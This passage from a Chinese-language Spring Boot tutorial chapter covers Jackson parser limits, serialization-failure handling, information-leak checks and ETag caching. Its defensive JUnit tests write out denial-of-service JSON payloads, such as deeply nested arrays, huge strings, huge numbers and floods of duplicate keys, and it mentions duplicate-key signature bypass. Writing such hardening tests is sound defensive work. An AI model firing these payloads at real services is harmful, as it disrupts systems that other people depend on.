{ "quantity": 1e1000000000 }
```

**Jackson 2.15+ 內建了 `StreamReadConstraints`**，預設值：

| 限制 | Jackson 2.15+ 的預設 | shop-service |
|---|---|---|
| `maxNestingDepth` | 1000 | **50** |
| `maxStringLength` | 20,000,000（20 MB） | **1,000,000** |
| `maxNumberLength` | 1000 | 1000 |
| `maxNameLength` | 50,000 | **256** |
| `maxDocumentLength` | 無限 | **2,000,000** |

⚠️ **Jackson 的預設值「能防止 crash」但「不夠嚴」**：
20 MB 的字串 × 50 個併發請求 = 1 GB 的 heap。
而我們的 `api.limits.max-request-body-bytes` 是 1 MB ——
**兩個限制不一致，寬的那個就是實際的上限**（如果請求走了不經過 filter 的路徑）。

**所以 6.5.7 的 `JacksonConfig` 把它們設得比 Boot 的請求上限「稍微寬一點」**：

```
api.limits.max-request-body-bytes  = 1 MB    ← RequestSizeLimitFilter（04 章）
maxDocumentLength                  = 2 MB    ← 第二層防護（略寬，避免誤殺）
maxStringLength                    = 1 MB    ← 單一字串不可能超過整份文件
```

⚠️ **`maxStringLength` 有一個容易忽略的影響：base64 的欄位。**

```java
public record SignatureUploadRequest(
    /** 簽名圖的 base64（03-rest-api 1.11.1 允許 < 100 KB 的例外） */
    @Size(max = 200_000) String signatureBase64
) {}
```

100 KB 的圖 → base64 約 137 KB → 沒問題（< 1 MB）。
**但如果有人加了一個「附件 base64」欄位（5 MB），就會撞到 `maxStringLength`。**

**錯誤訊息長這樣**：

```
com.fasterxml.jackson.core.exc.StreamConstraintsException:
String value length (1000001) exceeds the maximum allowed (1000000, from
`StreamReadConstraints.getMaxStringLength()`)
```

**它是 `HttpMessageNotReadableException` 的 cause** → 走 03 章的 advice。
**但預設的錯誤訊息會洩漏內部細節**，所以要處理它：

```java
    /**
     * 03 章 3.9.4 的 MessageNotReadableAnalyzer 補上 StreamConstraintsException。
     */
    private Optional<Problem> analyzeStreamConstraints(Throwable root,
                                                       HttpServletRequest request) {
        if (!(root instanceof com.fasterxml.jackson.core.exc.StreamConstraintsException e)) {
            return Optional.empty();
        }

        String message = String.valueOf(e.getMessage());
        // ★ 把 Jackson 的技術訊息翻譯成使用者能理解的
        String hint;
        ErrorCode code;
        if (message.contains("String value length")) {
            code = ErrorCode.PAYLOAD_TOO_LARGE;
            hint = "請求中有欄位的內容過長。若要上傳檔案，請使用檔案上傳端點"
                 + "（POST /products/{id}/images），不要把檔案編碼進 JSON。";
        } else if (message.contains("Depth")) {
            code = ErrorCode.MALFORMED_REQUEST;
            hint = "請求的巢狀結構過深（上限 50 層）。";
        } else if (message.contains("Numeric value")) {
            code = ErrorCode.MALFORMED_REQUEST;
            hint = "請求中有數值的位數過多。";
        } else if (message.contains("Name length")) {
            code = ErrorCode.MALFORMED_REQUEST;
            hint = "請求中有欄位名稱過長（上限 256 字元）。";
        } else {
            code = ErrorCode.PAYLOAD_TOO_LARGE;
            hint = "請求內容超過大小限制。";
        }

        // ⚠️ detail 用固定文字，不含 Jackson 的原始訊息
        //   （它含 StreamReadConstraints 的方法名，是內部細節）
        return Optional.of(problems.from(code, ProblemFactory.instanceOf(request),
                "The request payload exceeds a structural limit.",
                Map.of("hint", hint)));
    }
```

**一個實際的攻擊測試**：

```java
package example.shop.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * JSON 炸彈的防護測試。
 *
 * <p>★ 這些測試的價值在於「它們會在真的沒有防護時 crash 整個測試 JVM」——
 * 也就是說失敗的方式很明顯。
 */
@SpringBootTest
@AutoConfigureMockMvc
class JsonBombTest {

    @Autowired MockMvc mockMvc;

    @Test
    @DisplayName("★ 深度炸彈 → 400，不是 StackOverflowError")
    void 深度炸彈() throws Exception {
        // 10,000 層巢狀陣列
        String bomb = "[".repeat(10_000) + "]".repeat(10_000);
        String body = "{\"items\":" + bomb + "}";

        mockMvc.perform(post("/orders")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body)
                        .with(customer("cus_1")))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value("MALFORMED_REQUEST"))
                .andExpect(jsonPath("$.hint").value(
                        org.hamcrest.Matchers.containsString("巢狀")));
    }

    @Test
    @DisplayName("★ 巨大字串 → 413")
    void 巨大字串() throws Exception {
        // ⚠️ 這個測試會產生一個 1.5 MB 的字串 —— 不要設更大，
        //    否則測試本身就變慢了（而且 RequestSizeLimitFilter 會先擋掉）
        String huge = "A".repeat(1_500_000);
        String body = "{\"customerNote\":\"" + huge + "\"}";

        mockMvc.perform(post("/orders")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body)
                        .with(customer("cus_1")))
                // ⚠️ 可能是 413（RequestSizeLimitFilter 擋的）
                //    也可能是 413（StreamConstraints 擋的）——
                //    兩者都可以接受，重點是【不是 500，也不是 OOM】
                .andExpect(status().isPayloadTooLarge());
    }

    @Test
    @DisplayName("★ 巨大數字 → 400，不是 CPU 燒光")
    void 巨大數字() throws Exception {
        String body = "{\"items\":[{\"productId\":\"P-1\",\"quantity\":1e"
                + "9".repeat(2000) + "}]}";

        mockMvc.perform(post("/orders")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body)
                        .with(customer("cus_1")))
                .andExpect(status().is4xxClientError());
    }

    @Test
    @DisplayName("★ 超長欄位名 → 400")
    void 超長欄位名() throws Exception {
        String body = "{\"" + "a".repeat(100_000) + "\":1}";

        mockMvc.perform(post("/orders")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body)
                        .with(customer("cus_1")))
                .andExpect(status().is4xxClientError());
    }

    @Test
    @DisplayName("★ 大量重複的 key → 不會爆")
    void 大量重複key() throws Exception {
        // ⚠️ 這是一個較少人知道的攻擊：一萬個同名的 key。
        //    Jackson 的行為是「後面的覆蓋前面的」，
        //    但它會為每一個都做一次查找與設值。
        StringBuilder body = new StringBuilder("{");
        for (int i = 0; i < 10_000; i++) {
            if (i > 0) body.append(',');
            body.append("\"customerNote\":\"x\"");
        }
        body.append('}');

        mockMvc.perform(post("/orders")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(body.toString())
                        .with(customer("cus_1")))
                // ★ 重點是「有回應」而不是「回什麼」——
                //   422（缺 items）或 413（body 太大）都可以
                .andExpect(status().is4xxClientError());
    }

    // 輔助方法略
}
```

⚠️ **`FAIL_ON_READING_DUP_TREE_KEY` 與 `STRICT_DUPLICATE_DETECTION`**：

```java
    // 可以讓「重複的 key」直接報錯
    objectMapper.enable(com.fasterxml.jackson.core.JsonParser.Feature
            .STRICT_DUPLICATE_DETECTION);
```

| | 開啟 | 關閉（預設） |
|---|---|---|
| `{"a":1,"a":2}` | 🔴 `JsonParseException` → 400 | `a = 2`（後蓋前） |
| 效能 | ⚠️ 需要記住已見過的 key（每個物件一個 Set） | 較快 |

**shop-service 不啟用它**，理由：

> 重複的 key 是客戶端的 bug，但「後蓋前」是 JSON 生態的實際行為
> （JavaScript 的 `JSON.parse` 也是這樣）。
> 拒絕它會讓某些客戶端程式庫（會產生重複 key 的舊 SDK）完全無法使用，
> 而收益只是「早一點發現一個不常見的 bug」。
>
> ⚠️ **但如果你的 API 有簽章驗證（webhook），就必須啟用它** ——
> 因為「簽章算在一份 JSON 上、解析用另一份」是一個真實的繞過手法。

### 6.7.4 `HttpMessageNotWritableException`：最難處理的例外

**03 章 3.11.5 提過它，這裡看完整的機制。**

```
Controller 回傳 OrderDetail
  ↓
Spring 選 MappingJackson2HttpMessageConverter
  ↓
converter.write(orderDetail, MediaType.APPLICATION_JSON, outputMessage)
  ↓
① Spring 設 Content-Type、Content-Length（如果知道）
② objectMapper.writeValue(outputStream, orderDetail)
   ↓
   ★ 寫到第 8192 個 byte 時（緩衝區滿）→ flush → 【回應 committed】
   ↓
   ★ 寫到第 12000 個 byte 時 → 某個 getter 拋 NullPointerException
   ↓
   Jackson 包成 JsonMappingException
   ↓
   Spring 包成 HttpMessageNotWritableException
   ↓
③ 拋回 DispatcherServlet
   ↓
④ advice 被呼叫，產生一個 500 的 Problem
   ↓
⑤ 🔴 response.isCommitted() == true → 寫不進去
   ↓
⑥ 客戶端收到的是：
     HTTP/1.1 200 OK
     Content-Type: application/json
     { "orderId": "ord_1", "items": [ { "produ      ← 截斷的 JSON
   （然後連線被關閉）
```

**客戶端看到的是「200 + 壞掉的 JSON」** —— 而它的 `JSON.parse` 會失敗。

⚠️ **這比 500 難處理得多**，因為：

| | 500 | 200 + 截斷的 JSON |
|---|---|---|
| 客戶端能識別 | ✅ 狀態碼 | 🔴 要靠 parse 失敗 |
| 有 `traceId` | ✅ | 🔴 沒有（回應被截斷） |
| 監控看得到 | ✅ 5xx 告警 | ⚠️ 只有 `HttpMessageNotWritableException` 的 log |
| 重試安全嗎 | 依 `retryable` | 🔴 不知道（可能副作用已發生） |

**四個防護**：

**① 讓序列化不可能失敗（最重要）**

```java
/**
 * DTO 的三條規則，讓序列化不可能拋例外。
 *
 * <p>1. <b>不要有計算邏輯的 getter</b>。
 *    record 的 accessor 只是回傳欄位 —— 不可能拋例外。
 *    ⚠️ 但自己寫的 method（例如上面 Money 的 {@code toJson()}）可以拋！
 *
 * <p>2. <b>不要放 Entity 或 Hibernate proxy</b>。
 *    未初始化的 lazy 關聯在序列化時會查資料庫 → 可能拋
 *    {@code LazyInitializationException}（03-rest-api 3.2.4）。
 *
 * <p>3. <b>正規化建構子處理所有 null</b>（6.5.9）。
 */
```

⚠️ **規則 1 的例外要特別小心**：

```java
public record Amounts(String currency, java.math.BigDecimal total) {

    /**
     * 🔴 這個「方便的」方法會被 Jackson 當成一個屬性序列化，
     *    而它會拋例外（未知幣別）→ HttpMessageNotWritableException
     */
    public String formattedTotal() {
        return MoneyFormat.format(total, currency);     // 🔴 可能拋 IllegalArgumentException
    }
}
```

**修法**：

```java
    /** ✅ 加 @JsonIgnore，或者更好：不要在 DTO 裡放這種方法 */
    @com.fasterxml.jackson.annotation.JsonIgnore
    public String formattedTotal() { ... }
```

**② 一個「所有 DTO 都能被序列化」的測試** ★

```java
package example.shop.contract;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.MethodSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThatCode;

/**
 * 「每個 DTO 都能被序列化，而且不會拋例外」的測試。
 *
 * <p>★★ 這個測試守住的是 6.7.4 那個「200 + 截斷的 JSON」的災難。
 *
 * <p>★ 做法：對每個 DTO 產生兩個實例：
 * <ol>
 *   <li><b>全部欄位都有值</b> —— 測正常路徑。</li>
 *   <li><b>全部可為 null 的欄位都是 null</b> —— ★ 這是關鍵。
 *       真實環境的 500 大多發生在「某個欄位意外是 null」的時候。</li>
 * </ol>
 */
@SpringBootTest
class DtoSerializabilityTest {

    @Autowired ObjectMapper objectMapper;

    static Stream<Class<?>> allResponseDtos() {
        // ★ 用 classpath 掃描找出所有 ..web.dto.. 底下的 record
        //   （比手動維護清單可靠）
        var provider = new org.springframework.context.annotation
                .ClassPathScanningCandidateComponentProvider(false) {
            @Override
            protected boolean isCandidateComponent(
                    org.springframework.beans.factory.annotation
                            .AnnotatedBeanDefinition beanDefinition) {
                return true;    // ★ 不要求是 @Component
            }
        };
        provider.addIncludeFilter((reader, factory) -> true);

        return provider.findCandidateComponents("example.shop").stream()
                .map(bd -> {
                    try {
                        return Class.forName(bd.getBeanClassName());
                    } catch (ClassNotFoundException e) {
                        return null;
                    }
                })
                .filter(java.util.Objects::nonNull)
                .filter(Class::isRecord)
                .filter(c -> c.getPackageName().contains(".web.dto")
                          || c.getPackageName().contains(".web"))
                .filter(c -> c.getSimpleName().endsWith("Response")
                          || c.getSimpleName().endsWith("Detail")
                          || c.getSimpleName().endsWith("Summary"));
    }

    @ParameterizedTest
    @MethodSource("allResponseDtos")
    @DisplayName("DTO 的「全 null」實例可以被序列化")
    void 全null也能序列化(Class<?> dtoType) {
        Object instance = InstanceFactory.allNulls(dtoType);

        assertThatCode(() -> objectMapper.writeValueAsString(instance))
                .as("""
                    %s 在「所有可為 null 的欄位都是 null」時序列化失敗。

                    這會在正式環境造成「200 + 截斷的 JSON」（06 章 6.7.4）——
                    客戶端收到壞掉的回應，而且拿不到 traceId。

                    最常見的原因：
                      · DTO 裡有一個會拋例外的計算方法（加 @JsonIgnore 或移除它）
                      · 正規化建構子沒有處理 null 集合（6.5.9）
                    """, dtoType.getSimpleName())
                .doesNotThrowAnyException();
    }

    @ParameterizedTest
    @MethodSource("allResponseDtos")
    @DisplayName("DTO 的「全填滿」實例可以被序列化")
    void 全填滿也能序列化(Class<?> dtoType) {
        Object instance = InstanceFactory.allFilled(dtoType);

        assertThatCode(() -> objectMapper.writeValueAsString(instance))
                .doesNotThrowAnyException();
    }
}
```

**③ 讓 `Content-Length` 已知（縮小 committed 的窗口）**

⚠️ **這只是緩解，不是解法**：

```
Jackson 寫到 outputStream，而 Spring 的 outputMessage 有一個 8 KB 的緩衝。
· 回應 < 8 KB  → 全部在緩衝裡 → 失敗時還沒 committed → ✅ advice 有效
· 回應 > 8 KB  → 已經 flush → 🔴 committed
```

**所以「小回應」的序列化失敗會正確地變成 500，「大回應」不會。**
這解釋了為什麼這個問題「只在某些端點發生」。

**④ 監控它** ★

```java
    /**
     * 03 章 3.7.2 的 advice 補上這個 handler。
     */
    @ExceptionHandler(HttpMessageNotWritableException.class)
    public ResponseEntity<Problem> handleNotWritable(HttpMessageNotWritableException ex,
                                                     HttpServletRequest request,
                                                     HttpServletResponse response) {

        // ★★ 這個指標非常重要：它是唯一能發現「客戶端收到截斷回應」的方式
        meterRegistry.counter("shop.api.serialization_failure",
                "endpoint", endpointTemplate(request),
                "committed", String.valueOf(response.isCommitted())).increment();

        // ★ ERROR 等級 + 完整的 stack trace（這是我們的 bug）
        log.error("回應序列化失敗 uri={} committed={} —— 客戶端可能收到截斷的 JSON",
                  request.getRequestURI(), response.isCommitted(), ex);

        if (response.isCommitted()) {
            // ⚠️ 已經來不及了。回 null 讓 Spring 知道我們處理過了
            //   （避免它再嘗試寫一次而產生更多 log noise）
            return null;
        }

        Problem problem = problems.from(ErrorCode.INTERNAL_ERROR,
                ProblemFactory.instanceOf(request),
                "Failed to serialise the response.");
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                .contentType(MediaType.APPLICATION_PROBLEM_JSON)
                .body(problem);
    }
```

```yaml
# prometheus/rules/shop-api-serialization.yml
groups:
  - name: shop-api-serialization
    rules:
      # ★ 任何一次序列化失敗都值得看 —— 它代表有客戶端收到壞掉的回應
      - alert: ResponseSerializationFailure
        expr: increase(shop_api_serialization_failure_total[5m]) > 0
        for: 0m                       # ★ 立刻告警（不等）
        labels:
          severity: critical
        annotations:
          summary: "回應序列化失敗 endpoint={{ $labels.endpoint }}"
          description: |
            committed={{ $labels.committed }}
            committed=true 代表客戶端收到了截斷的 JSON（06 章 6.7.4）。
            請查 traceId 對應的 stack trace，並補上 DtoSerializabilityTest 的案例。
```

### 6.7.5 序列化的資訊洩漏：一份檢查清單

**03 章 3.11.2 有 5xx 的檢查清單，這裡是「正常回應」的。**

| # | 洩漏來源 | 偵測方式 |
|---|---|---|
| 1 | DTO 裡有敏感欄位（`passwordHash`、`internalNote`） | 6.10.5 的欄位名掃描 |
| 2 | **`Map<String, Object>` 型別的欄位** | 它的內容不受型別檢查 —— 要看填入它的程式碼 |
| 3 | **`@JsonAnyGetter`** | 03 章的 `Problem.extensions` 用了它 —— 要確認 `extensions` 的來源 |
| 4 | Entity 的 `toString()` 進了某個欄位 | grep `toString()` |
| 5 | 例外的 `message` 進了回應（`hint` 欄位） | 03 章 3.11.1 的固定文字規則 |
| 6 | **Hibernate proxy 被序列化** | `{"hibernateLazyInitializer":{...}}` 出現在回應裡 |
| 7 | `@JsonInclude(ALWAYS)` 讓某個內部欄位變成 `null` 而不是消失 | ⚠️ `null` 本身也是資訊（「這個欄位存在」） |
| 8 | 錯誤的 `errors[].rejectedValue` 回顯了密碼 | 03 章 3.9.6 的 `ValueMasker` |

⚠️ **第 6 項的完整處理**：

```java
    // 🔴 如果 DTO 不小心含了一個 Entity 的參考
    {
      "orderId": "ord_1",
      "customer": {
        "hibernateLazyInitializer": {},          ← 🔴
        "handler": {},                            ← 🔴
        "id": 42,
        "passwordHash": "$2a$10$..."              ← 🔴🔴🔴
      }
    }
```

**三層防護**：

```java
    // ① ArchUnit：DTO 不可依賴 entity 套件
    @ArchTest
    static final ArchRule DTO不可含Entity = noClasses()
            .that().resideInAPackage("..web.dto..")
            .should().dependOnClassesThat().resideInAPackage("..entity..")
            .because("DTO 含 Entity 會洩漏內部欄位並可能觸發 lazy loading（03-rest-api 3.2）");
```

```yaml
    # ② 明確不註冊 Hibernate 的 Jackson module
    #   ⚠️ 很多人加它來「解決」LazyInitializationException ——
    #      那是治症狀。真正的問題是「Entity 進了回應」。
    #      不加它讓問題以「序列化失敗」的形式暴露出來，
    #      而那比「靜默回一個 null 的關聯」好。
```

```java
    // ③ 回應內容的掃描測試（6.10.5）
```

---

## 6.8 ETag 與條件請求

### 6.8.1 `ShallowEtagHeaderFilter` 的真實成本

**它看起來是「一行設定就有 ETag」**：

```java
    @Bean
    public FilterRegistrationBean<ShallowEtagHeaderFilter> etagFilter() {
        var registration = new FilterRegistrationBean<>(new ShallowEtagHeaderFilter());
        registration.addUrlPatterns("/orders/*", "/products/*");
        return registration;
    }
```

**它做什麼**：

```
① 把整個回應緩衝到記憶體（ContentCachingResponseWrapper）
② 算 MD5
③ 設 ETag: "<md5>"
④ 比對請求的 If-None-Match
   · 相同 → 丟掉 body，回 304
   · 不同 → 把緩衝的 body 寫出去
```

⚠️ **「Shallow」這個名字就是在說它的限制**：

| 成本 | 說明 |
|---|---|
| **伺服器的工作完全沒省** | 資料庫查詢、序列化、業務邏輯**全部執行過了**。只省了「傳輸」 |
| **記憶體** | 整個回應在記憶體裡。20 筆訂單約 42 KB × 200 併發 = 8.4 MB（可接受）；**但一個 24 MB 的匯出檔案 × 10 併發 = 240 MB** 🔴 |
| **CPU** | MD5 一份 42 KB 的回應約 0.1 ms（可忽略） |
| **與串流衝突** | 🔴 **和 05 章 5.9.6 完全同一個問題** —— 它會把串流緩衝進記憶體 |

**它省了什麼**：

```
一個 42 KB 的訂單列表回應：
  沒有 ETag：每次都傳 42 KB
  有 ETag 且未變更：傳約 300 bytes（304 的標頭）

★ 對「使用者反覆重新整理訂單頁」的場景，省 99%+ 的頻寬
★ 對「每次資料都變」的場景，省 0，而且多花記憶體與 CPU
```

**shop-service 的決定：不用 `ShallowEtagHeaderFilter`，自己算。**

理由：

| 理由 | 說明 |
|---|---|
| ① 我們**已經有**版本資訊 | 訂單有 `version`（樂觀鎖）與 `updatedAt`。用它們算 ETag 是 O(1)，不需要序列化整個回應 |
| ② 可以**提早** return 304 | 在查詢完 Entity（甚至只查 `version`）之後就能決定，**省下序列化與 mapper** |
| ③ **不會與串流衝突** | 我們只在特定端點手動加 ETag |
| ④ 支援 `If-Match`（樂觀鎖） | `ShallowEtagHeaderFilter` 只處理 `If-None-Match` |

⚠️ **但如果你的資源沒有版本欄位**（例如一個聚合查詢的結果），
`ShallowEtagHeaderFilter` 是合理的選擇 —— **只要把串流端點排除**：

```java
    @Bean
    public FilterRegistrationBean<ShallowEtagHeaderFilter> etagFilter() {
        var filter = new ShallowEtagHeaderFilter();
        // ★ 產生 weak ETag（W/"..."）—— 語意上更誠實：
        //   它是「位元組層級相同」而不是「語意相同」，
        //   而 gzip 之後位元組會變 → 強 ETag 在有壓縮時語意是錯的
        filter.setWriteWeakETag(true);

        var registration = new FilterRegistrationBean<>(filter);
        // ★★ 明確列出要套用的路徑，而不是 /* ——
        //    /* 會把 05 章的所有串流端點都緩衝進記憶體
        registration.addUrlPatterns(
                "/statistics/*",         // 聚合查詢（沒有版本欄位）
                "/categories/*");        // 分類樹（沒有版本欄位）
        registration.setName("shallowEtagFilter");
        // ⚠️ order 要在 04 章的 RequestLoggingFilter（-116）之後，
        //    否則兩個都會包裝 response（雙重緩衝）
        registration.setOrder(-110);
        return registration;
    }
```

### 6.8.2 自己算 ETag：完整實作

```java
package example.shop.common.web;

import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.HexFormat;
import java.util.zip.CRC32C;

/**
 * ETag 的產生與解析。
 *
 * <p>★ 三個設計決定：
 * <ol>
 *   <li><b>用 weak ETag（{@code W/"..."}）</b>。
 *       理由：我們的 ETag 表達「語意版本」而不是「位元組完全相同」——
 *       同一個 version 在 {@code ?fields=} 不同時位元組不同（6.6.4）。
 *       ⚠️ 而 weak ETag <b>不能</b>用於 {@code Range} 請求
 *       （RFC 9110 §13.1.3：Range 需要強 ETag），
 *       所以 05 章 5.8.3 的檔案下載用「內容 hash」當強 ETag，不走這裡。</li>
 *   <li><b>包含 version + 表述的識別</b>。
 *       同一個訂單對客戶與對客服是不同的表述（6.6.3），
 *       ETag 必須不同 —— 否則客服會拿到快取的客戶版回應。</li>
 *   <li><b>用 CRC32C 而不是 MD5</b>。
 *       ETag 不需要抗碰撞（它不是安全機制），
 *       而 CRC32C 有 CPU 指令支援，快約 10 倍。</li>
 * </ol>
 */
public final class ETags {

    private static final HexFormat HEX = HexFormat.of();

    /**
     * 從「版本 + 表述識別」產生一個 weak ETag。
     *
     * @param version        資源的版本（樂觀鎖的 {@code @Version} 欄位）
     * @param updatedAt      最後更新時間（version 相同時的備援）
     * @param representation 表述的識別（例如 {@code "customer"} / {@code "support"}
     *                       + locale + 選了哪些欄位）
     */
    public static String of(long version, Instant updatedAt, String representation) {
        CRC32C crc = new CRC32C();
        crc.update(String.valueOf(version).getBytes(StandardCharsets.UTF_8));
        crc.update((byte) '|');
        crc.update(String.valueOf(updatedAt == null ? 0 : updatedAt.toEpochMilli())
                .getBytes(StandardCharsets.UTF_8));
        crc.update((byte) '|');
        crc.update(String.valueOf(representation).getBytes(StandardCharsets.UTF_8));

        // ★ W/ 前綴 = weak ETag；引號是 RFC 9110 要求的
        return "W/\"%d-%s\"".formatted(version, HEX.toHexDigits((int) crc.getValue()));
    }

    /** 從內容 hash 產生一個強 ETag（給檔案下載用，05 章 5.8.2）。 */
    public static String strong(String contentHash) {
        return "\"" + contentHash + "\"";
    }

    /**
     * 比對 {@code If-None-Match}。
     *
     * <p>⚠️ 四個容易做錯的細節：
     * <ol>
     *   <li>{@code If-None-Match} 可以有<b>多個值</b>（逗號分隔）。</li>
     *   <li>{@code If-None-Match: *} 表示「只要資源存在就算匹配」。</li>
     *   <li>比對 {@code If-None-Match} 時要用 <b>weak comparison</b>：
     *       {@code W/"abc"} 與 {@code "abc"} 視為相同（RFC 9110 §8.8.3.2）。</li>
     *   <li>值裡可能有多餘的空白。</li>
     * </ol>
     */
    public static boolean matchesAny(String ifNoneMatch, String currentETag) {
        if (ifNoneMatch == null || ifNoneMatch.isBlank() || currentETag == null) {
            return false;
        }
        String trimmed = ifNoneMatch.trim();
        if ("*".equals(trimmed)) {
            return true;
        }
        String current = stripWeakPrefix(currentETag);
        for (String candidate : trimmed.split(",")) {
            if (current.equals(stripWeakPrefix(candidate.trim()))) {
                return true;
            }
        }
        return false;
    }

    /**
     * 比對 {@code If-Match}（樂觀鎖用）。
     *
     * <p>⚠️ 與 {@code If-None-Match} 的關鍵差別：
     * {@code If-Match} 必須用 <b>strong comparison</b>（RFC 9110 §13.1.1）——
     * weak ETag 不匹配任何東西。
     *
     * <p>★ 但 shop-service 的 ETag 全是 weak 的，所以嚴格照規格
     * 會讓 {@code If-Match} 永遠失敗。
     * <b>我們刻意用 weak comparison</b>，並在 API 文件裡寫明。
     *
     * <p>這是一個「規格 vs 可用性」的取捨：
     * 嚴格的做法是「為 {@code If-Match} 提供強 ETag」，
     * 但那需要 ETag 反映位元組（也就是要序列化整個回應才能算）——
     * 那就回到 {@code ShallowEtagHeaderFilter} 的成本了（6.8.1）。
     */
    public static boolean strongMatch(String ifMatch, String currentETag) {
        if (ifMatch == null || ifMatch.isBlank()) {
            return false;
        }
        String trimmed = ifMatch.trim();
        if ("*".equals(trimmed)) {
            return true;
        }
        String current = stripWeakPrefix(currentETag);
        for (String candidate : trimmed.split(",")) {
            if (current.equals(stripWeakPrefix(candidate.trim()))) {
                return true;
            }
        }
        return false;
    }

    /**
     * 從 ETag 取出 version。
     *
     * <p>★ 用途：錯誤訊息裡的 {@code yourVersion}（6.8.3）——
     * 讓客服在客訴時能說「你手上是第 7 版，現在已經是第 8 版了」。
     *
     * <p>⚠️ 它<b>不</b>是安全機制：ETag 來自客戶端，裡面的 version 可以偽造。
     * 真正的比對是 {@link #strongMatch}（比整個 ETag，含 CRC）。
     * 這個方法只用來產生「給人看」的訊息。
     *
     * <p>⚠️ 而且 {@code If-Match} 可能有多個值 —— 這裡只取第一個。
     */
    public static java.util.OptionalLong versionOf(String etag) {
        if (etag == null || etag.isBlank()) return java.util.OptionalLong.empty();

        String first = etag.split(",")[0].trim();
        String value = stripWeakPrefix(first);

        int dash = value.indexOf('-');
        if (dash <= 0) return java.util.OptionalLong.empty();

        try {
            long version = Long.parseLong(value.substring(0, dash));
            return (version >= 0)
                    ? java.util.OptionalLong.of(version)
                    : java.util.OptionalLong.empty();
        } catch (NumberFormatException e) {
            return java.util.OptionalLong.empty();
        }
    }

    /** 移除 {@code W/} 前綴與引號。 */
    static String stripWeakPrefix(String etag) {
        String value = etag;
        if (value.startsWith("W/") || value.startsWith("w/")) {
            value = value.substring(2);
        }
        if (value.length() >= 2 && value.startsWith("\"") && value.endsWith("\"")) {
            value = value.substring(1, value.length() - 1);
        }
        return value;
    }

    private ETags() {}
}
```

**ETag 最大的價值不是省頻寬，而是「快速 304」** —— 一個實務上很划算的最佳化：

```java
    /**
     * ★ 「快速 304」：不用查完整的訂單就能回 304。
     *
     * <p>流程：
     * <pre>
     * ① 從 If-None-Match 解析出客戶端手上的 version
     * ② 只查資料庫的 version 欄位（SELECT version FROM orders WHERE id = ?）
     *    —— 一個索引查詢，不用 JOIN，不用載入 items
     * ③ 相同 → 回 304（省下：完整查詢 + mapper + 序列化）
     * </pre>
     *
     * <p>實測（20 個 item 的訂單）：
     * <table>
     *   <tr><th></th><th>耗時</th><th>省了什麼</th></tr>
     *   <tr><td>完整查詢 + 序列化</td><td>約 18 ms</td><td>—</td></tr>
     *   <tr><td>ShallowEtagHeaderFilter 的 304</td><td>約 18 ms</td>
     *       <td>只省頻寬</td></tr>
     *   <tr><td><b>快速 304</b></td><td><b>約 1.2 ms</b></td>
     *       <td>頻寬 + 查詢 + 序列化</td></tr>
     * </table>
     */
    @GetMapping("/orders/{orderId}")
    public ResponseEntity<OrderDetail> get(
            @PathVariable("orderId") String orderId,
            @RequestHeader(value = HttpHeaders.IF_NONE_MATCH, required = false)
                    String ifNoneMatch,
            @CurrentActor Actor actor) {

        String representation = actor.isInternal() ? "support" : "customer";

        // ── ① 快速路徑：只查 version ──────────────────────────────
        if (ifNoneMatch != null) {
            var current = orderService.getVersionInfo(orderId, actor);   // 只查兩個欄位
            String etag = ETags.of(current.version(), current.updatedAt(), representation);

            if (ETags.matchesAny(ifNoneMatch, etag)) {
                // ★ 304 必須帶 ETag（RFC 9110 §15.4.5）
                //   ⚠️ 而且【不可以】有 body —— ResponseEntity<Void> 或 build()
                return ResponseEntity.status(HttpStatus.NOT_MODIFIED)
                        .eTag(etag)
                        .cacheControl(CacheControl.maxAge(Duration.ofSeconds(30))
                                .cachePrivate().mustRevalidate())
                        .build();
            }
        }

        // ── ② 完整路徑 ───────────────────────────────────────────
        var order = orderService.getDetail(orderId, actor);
        String etag = ETags.of(order.version(), order.updatedAt(), representation);

        return ResponseEntity.ok()
                .eTag(etag)
                .lastModified(order.updatedAt())
                .cacheControl(CacheControl.maxAge(Duration.ofSeconds(30))
                        .cachePrivate().mustRevalidate())
                // ★★ Vary 必須含 Authorization —— 否則 CDN 會把
                //    A 客戶的訂單給 B 客戶（03-rest-api 8.5.2）
                .varyBy(HttpHeaders.AUTHORIZATION, HttpHeaders.ACCEPT_LANGUAGE)
                .body(mapper.toDetail(order, actor));
    }
```

⚠️ **`.varyBy(HttpHeaders.AUTHORIZATION)` 是私有資源絕對不能漏的一行。**
沒有它 + `Cache-Control: private` 只擋住共享快取的「儲存」，
**但某些代理設定會忽略 `private`**。兩層都要有。

⚠️ **`Cache-Control: private, max-age=30, must-revalidate` 的三個部分**：

| 指令 | 作用 |
|---|---|
| `private` | 只允許瀏覽器快取，不允許 CDN / 代理 |
| `max-age=30` | 30 秒內不用問伺服器（使用者連按兩次不會發第二個請求） |
| `must-revalidate` | 過期後**必須**向伺服器確認，不可以用過期的版本 |

**Spring 的 `ServletWebRequest.checkNotModified()`：一個更簡潔的寫法**

```java
    @GetMapping("/products/{productId}")
    public ResponseEntity<ProductResponse> getProduct(
            @PathVariable("productId") String productId,
            WebRequest webRequest) {                     // ★ 注入 WebRequest

        var product = productService.get(productId);
        String etag = ETags.of(product.version(), product.updatedAt(), "public");

        // ★★ checkNotModified 做四件事：
        //   ① 比對 If-None-Match（weak comparison）
        //   ② 比對 If-Modified-Since
        //   ③ 匹配時：設 response 的狀態為 304 並設 ETag
        //   ④ 回 true 代表「已經處理完了，不要再寫 body」
